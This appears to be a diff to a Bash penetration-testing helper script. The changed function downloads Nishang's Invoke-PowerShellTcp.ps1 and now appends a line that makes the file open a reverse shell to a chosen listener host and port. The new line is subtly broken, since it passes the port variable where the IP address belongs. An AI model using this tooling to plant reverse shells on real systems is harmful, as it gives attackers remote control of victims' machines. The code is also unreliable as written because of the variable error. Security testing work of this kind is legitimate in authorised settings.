@@ -47,6 +47,7 @@ nb-install-ldapdomaindump
 nb-install-windapsearch
 nb-install-username-anarchy
 nb-install-username-generator
+nb-install-invoke-powershelltcp
 
 DOC
 }
@@ -711,5 +712,13 @@ nb-install-invoke-powershelltcp() {
     if __check-proceed; then
         wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O "$pws"
     fi
-}
 
+    __cyan "Do you want to append reverse shell to the file?"
+    if __check-proceed; then
+        nb-vars-set-lhost
+        nb-vars-set-lport
+        echo "Invoke-PowerShellTcp -Reverse -IPAddress ${__LPORT} -Port ${__LPORT}" >> "$pws"
+        __info "Reverse shell successfully appended."
+        return
+    fi
+}
